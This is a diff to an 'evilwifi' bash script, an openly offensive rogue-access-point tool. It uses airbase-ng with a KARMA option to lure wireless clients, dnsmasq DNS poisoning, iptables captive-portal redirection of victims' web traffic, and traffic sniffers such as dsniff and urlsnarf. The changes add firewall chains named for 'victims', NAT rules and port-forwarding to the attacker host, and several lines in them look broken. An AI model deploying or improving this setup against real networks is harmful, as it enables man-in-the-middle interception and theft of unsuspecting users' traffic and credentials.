@@ -10,7 +10,7 @@ TAPIP=10.0.0.1             #ip address of moniface
 NETMASK=255.255.0.0        #subnetmask
 WILDCARD=0.0.255.255       #dunno what this is
 # =>
-# NETWORK=/16
+NETWORK=10.0.0.0/16
 TAPIPBLOCK=10.0.0.0        #subnet
 DHCPS=10.0.0.1             #dhcp start range
 DHCPE=10.0.255.254         #dhcp end range
@@ -24,7 +24,6 @@ termwidth=130
 folder=/tmp/.evilwifi
 settings=evilwifi.conf
 karma_enabled=1
-dnsmasqconf=/etc/dnsmasq.conf
 ########################################
 ### IF YOU TOUCH ANYTHING UNDER THIS ### 
 ### NO SUPPORT WILL BE GIVEN TO YOU  ###
@@ -39,9 +38,6 @@ REVISION=051
 #############################
 #function customfirewall(){
 #iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
-#iptables -t nat -A YOURRULEHERE
-#iptables -t nat -A YOURRULEHERE
-#iptables -t nat -A YOURRULEHERE
 #iptables -t nat -A YOURRULEHERE
 #}
 function banner(){
@@ -93,10 +89,13 @@ trap control_c INT
 function pinginternet(){
 INTERNETTEST=$(awk '/bytes from/ { print $1 }' < <(ping 8.8.8.8 -c 1 -w 3))
 if [ "$INTERNETTEST" = "64" ]; then INTERNET=TRUE; else INTERNET=FALSE; fi
+WANIP=$(curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+')
+if [ "$WANIP" != "" ]; then INTERNET=TRUE; ICMPBLOCK=TRUE; else INTERNET=FALSE; fi
 }
 function dnscheck(){
 DNSCHECK=$(awk '/bytes from/ { print $1 }' < <(ping raw.github.com -c 1 -w 3))
 if [ "$DNSCHECK" = "64" ]; then DNS=TRUE; else DNS=FALSE; fi
+if [ "$ICMPBLOCK" = "TRUE" ]; then DNS=TRUE; fi
 }
 function pinggateway(){
 GATEWAYRDNS=$(awk '/br-lan/ && /UG/ {print $2}' < <(route))
@@ -196,11 +195,13 @@ pgrep dnsmasq > $sessionfolder/pids/dnsmasq.pid
 pgrep hostapd > $sessionfolder/pids/hostapd.pid
 pgrep dumpcap > $sessionfolder/pids/dumpcap.pid
 pgrep wireshark > $sessionfolder/pids/wireshark.pid
+pgrep lighttpd > $sessionfolder/pids/lighttpd.pid
 }
 function stopshit(){
 pspids
-service apache2 stop &>$LOG
-service dhcp3-server stop &>$LOG
+service lighttpd stop &>>$LOG
+service apache2 stop &>>$LOG
+service dhcp3-server stop &>>$LOG
 while [ -s $sessionfolder/pids/airbase-ng.pid ]; do
 sleep 2
 pspids
@@ -237,7 +238,7 @@ kill `cat /var/run/dhcpd/$TAPIFACE.pid 2>$LOG` &>/dev/null;
 fi
 killall -9 airodump-ng aireplay-ng mdk3 driftnet urlsnarf dsniff &>/dev/null
 firewallreset
-#if [ "$ATHIFACE" != "" ]; then ifconfig $ATHIFACE down; fi
+if [ "$ATHIFACE" != "" ]; then ifconfig $ATHIFACE down; fi
 if [ "$TAPIFACE" != "" ]; then ifconfig $TAPIFACE down; fi
 }
 function cleanup(){
@@ -352,8 +353,8 @@ echo "}" >> $dhcpconf
 dhcpdserver
 }
 function dnsmasqconfig(){
+dnsmasqconf=$sessionfolder/config/dnsmasq.conf
 echo "# auto-generated config file from evilwifi.sh" > $dnsmasqconf
-# echo "conf-file=/etc/dnsmasq.conf" >> $dnsmasqconf
 echo "address=/$DNSURL/$TAPIP" >> $dnsmasqconf
 # echo "ptr-record=$arpaaddr.in-addr.arpa,$hostname.wirelesslan" >> $dnsmasqconf
 echo "dhcp-authoritative" >> $dnsmasqconf
@@ -368,7 +369,7 @@ echo "log-dhcp" >> $dnsmasqconf
 # echo "bogus-priv" >> $dnsmasqconf
 # echo "expand-hosts" >> $dnsmasqconf
 echo "" >> $dnsmasqconf
-# echo "interface=$TAPIFACE" >> $dnsmasqconf
+echo "interface=$TAPIFACE" >> $dnsmasqconf
 echo "dhcp-leasefile=$sessionfolder/dnsmasq.leases" >> $dnsmasqconf
 echo "resolv-file=$sessionfolder/resolv.conf.auto" >> $dnsmasqconf
 echo "stop-dns-rebind" >> $dnsmasqconf
@@ -410,6 +411,10 @@ echo "# server.groupname = \"root\"" >> /etc/lighttpd.conf
 ####################
 # FIREWALL RELATED #
 ####################
+function listeningports(){
+netstat -npltw | awk '/0.0.0.0/ {print $4}' | cut -f2 -d ':' > $sessionfolder/logs/listentcp.txt
+netstat -npluw | awk '/0.0.0.0/ {print $4}' | cut -f2 -d ':' > $sessionfolder/logs/listenudp.txt
+}
 function firewallreset(){
 iptables --flush
 iptables --table nat --flush
@@ -421,14 +426,53 @@ iptables --table mangle --delete-chain
 echo "0" > /proc/sys/net/ipv4/ip_forward
 }
 function firewall(){
+iptables -N logaccept
+iptables -N logdrop
+iptables -N logbrute
+iptables -N logreject
+iptables -N victim2wan
+iptables -N victim2lan
+iptables -N LOG
+iptables -N REJECT
+iptables -N DROP
 iptables -P FORWARD ACCEPT
 iptables -P INPUT ACCEPT
 iptables -A INPUT -i lo -j ACCEPT
-iptables -t nat -A POSTROUTING -j MASQUERADE
-#customfirewall
 echo "1" > /proc/sys/net/ipv4/ip_forward
 }
+function firewalltesting(){
+####################
+# PRE NAT FIREWALL #
+####################
+iptables -A INPUT -m state --state RELATED,ESTABLISHED -j logaccept
+iptables -A INPUT -i $TAPIFACE -j logaccept
+iptables -A INPUT -i $WANIFACE -p tcp --dport 22 -j logbrute
+iptables -A INPUT -p tcp -d $TAPIP --dport 22 -j logaccept
+iptables -A INPUT -i $WANIFACE -p icmp -j ACCEPT
+iptables -A INPUT -i lo -m state --state NEW -j ACCEPT
+iptables -A INPUT -i $TAPIFACE -m state --state NEW -j logaccept
+iptables -A INPUT -j logdrop
+iptables -A FORWARD -o $WANIFACE -s $NETWORK -j logaccept
+iptables -A FORWARD -i $TAPIFACE -j logaccept
+iptables -A FORWARD -i $TAPIFACE -o $TAPIFACE -j logaccept
+iptables -A FORWARD -j victim2wan
+iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j logaccept
+iptables -A FORWARD -i $TAPIFACE -o $WANIFACE -j logaccept
+iptables -A FORWARD -o $TAPIFACE -d $TAPIP -j logaccept
+iptables -A FORWARD -i $TAPIFACE -m state --state NEW -j logaccept
+iptables -A FORWARD -j logdrop
+iptables -A OUTPUT -o $TAPIFACE -j logaccept
+iptables -A logaccept -j ACCEPT
+iptables -A logbrute -j logdrop
+iptables -A logdrop -j DROP
+iptables -A logreject -p tcp --reject-with tcp-reset -j REJECT
+customfirewall
+}
+###############################
+# NETWORK ADDRESS TRANSLATION #
+###############################
 function firewallbrlan(){
+iptables -t nat -A POSTROUTING -o $WANIFACE -s $NETWORK -j SNAT --to-destination $WANIP
 iptables -t nat -A POSTROUTING -o br-lan -j MASQUERADE
 }
 function firewallportal(){
@@ -436,18 +480,20 @@ iptables -t mangle -N internet
 iptables -t mangle -A PREROUTING -i $TAPIFACE -p tcp -m tcp --dport 80 -j internet
 iptables -t mangle -A internet -j MARK --set-mark 99
 iptables -t nat -A PREROUTING -i $TAPIFACE -p tcp -m mark --mark 99 -m tcp --dport 80 -j DNAT --to-destination $TAPIP
-}
-function firewalltesting(){
-iptables -A FORWARD -i $TAPIFACE -j ACCEPT
-#iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $TAPIP:53
-#iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $TAPIP:53
-#iptables -t nat -A PREROUTING -p tcp --dport 67 -j DNAT --to-destination $TAPIP:67
-#iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT --to-destination $TAPIP:67
-#iptables -t nat -A PREROUTING -p tcp --dport 68 -j DNAT --to-destination $TAPIP:68
-#iptables -t nat -A PREROUTING -p udp --dport 68 -j DNAT --to-destination $TAPIP:68
-#iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $TAPIP:80
-#iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $TAPIP:443
-#iptables -t nat -A POSTROUTING -o $TAPIFACE -j MASQUERADE
+#iptables -t nat -A PREROUTING $TAPIFACE -p tcp --dport 53 -j DNAT --to-destination $TAPIP:53
+#iptables -t nat -A PREROUTING $TAPIFACE -p udp --dport 53 -j DNAT --to-destination $TAPIP:53
+#iptables -t nat -A PREROUTING $TAPIFACE -p tcp --dport 67 -j DNAT --to-destination $TAPIP:67
+#iptables -t nat -A PREROUTING $TAPIFACE -p udp --dport 67 -j DNAT --to-destination $TAPIP:67
+#iptables -t nat -A PREROUTING $TAPIFACE -p tcp --dport 68 -j DNAT --to-destination $TAPIP:68
+#iptables -t nat -A PREROUTING $TAPIFACE -p udp --dport 68 -j DNAT --to-destination $TAPIP:68
+#iptables -t nat -A PREROUTING $TAPIFACE -p tcp --dport 80 -j DNAT --to-destination $TAPIP:80
+#iptables -t nat -A PREROUTING $TAPIFACE -p tcp --dport 443 -j DNAT --to-destination $TAPIP:443
+listeningports
+for TCPPORT in `grep -v N $sessionfolder/logs/listentcp.txt`; do 
+iptables -t nat -A PREROUTING $TAPIFACE -p tcp --dport $TCPPORT -j DNAT --to-destination $TAPIP:$TCPPORT; done
+for UDPPORT in `grep -v N $sessionfolder/logs/listenudp.txt`; do 
+iptables -t nat -A PREROUTING $TAPIFACE -p udp --dport $UDPPORT -j DNAT --to-destination $TAPIP:$UDPPORT; done
+iptables -t nat -A POSTROUTING -o $TAPIFACE -s $NETOWRK -d $NETWORK -j MASQUERADE
 }
 #####################
 # STARTING SERVICES #
@@ -458,21 +504,22 @@ hostapd -dd -f $sessionfolder/logs/hostapd.log -P $sessionfolder/pids/hostapd.pi
 sleep 7
 }
 function startairbase(){
-echo "* STARTING SERVICE: AIRBASE-NG *"
-airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 15 -v > $sessionfolder/logs/airbaseng.log &
+if [ "karma_enabled" != "1" ]; then KARMA=`-e "$ESSID"`;
+echo "* STARTING SERVICE: AIRBASE-NG (WITH KARMA) *"; else echo "* STARTING SERVICE: AIRBASE-NG *"; fi
+airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT $KARMA $OTHEROPTS $MONIFACE -P -C 15 -v > $sessionfolder/logs/airbaseng.log &
 }
 function startdnsmasq(){
 echo "no-poll" >> /etc/dnsmasq.conf
 echo "no-resolv" >> /etc/dnsmasq.conf
 echo "* DNSMASQ DNS POISON!!! *"
 gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=DNSERVER -e \
-"dnsmasq --no-daemon --interface=$TAPIFACE -C $dnsmasqconf"
+"dnsmasq --no-daemon -C $dnsmasqconf"
 }
 function startdnsmasqresolv(){
 echo "dhcp-option=wirelesslan,6,$TAPIP,8.8.8.8" >> /etc/dnsmasq.conf
 echo "* DNSMASQ With Internet *"
 gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=DNSERVER -e \
-"dnsmasq --no-daemon --interface=$TAPIFACE --except-interface=lo -C $dnsmasqconf"
+"dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
 }
 function udhcpdserver(){
 gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title=DHCP-"$ESSID" -e \
@@ -642,6 +689,9 @@ echo ""
 read -e -p "Option: " internetmenu
 echo ""
 if [ "$internetmenu" = "" ]; then clear; internetmenu; fi
+}
+function runscript(){
+echo "Running Script...."
 }
 function poisonmenu(){
 echo "+===================================+"
@@ -1043,6 +1093,11 @@ done
 # +===================================+
 # | ANYTHING ABOVE THIS IS UNTESTED   |
 # +===================================+
+
+# --------------------------- #
+# SCRIPT ACTUALLY STARTS HERE #
+# --------------------------- #
+
 mydistro="`awk '{print $1}' /etc/issue`"
 myversion="`awk '{print $2}' /etc/issue`"
 myrelease="`awk '{print $3}' /etc/issue`"
@@ -1065,6 +1120,7 @@ if [ "$mydistro" = "Ubuntu" ]; then echo "| [$OK] $mydistro Version $myversion";
 echo "| [$OK] SCRIPT REVISION: $REVISION"
 if [ "$INTERNET" = "FALSE" ]; then echo "| [$FAIL] No Internet Connection : - ("; fi
 if [ "$INTERNET" = "TRUE" ]; then echo "| [$OK] We Have Internet :-)"; dnscheck; fi
+if [ "$ICMPBLOCK" = "TRUE" ]; then echo "| [!] Outbound ICMP Ping Is Blocked WAN SIDE ($WANIP)"; fi
 if [ "$DNS" = "FALSE" ]; then echo "| [$FAIL] DNS Error Cant Update Check"; fi
 type -P aircrack-ng &>/dev/null || { echo "| [FATAL] aircrack-ng"; echo "aircrack-ng" >> $sessionfolder/logs/missing.log;}
 type -P dnsmasq &>/dev/null || { echo "| [$FAIL] dnsmasq"; echo "dnsmasq" >> $sessionfolder/logs/missing.log;}
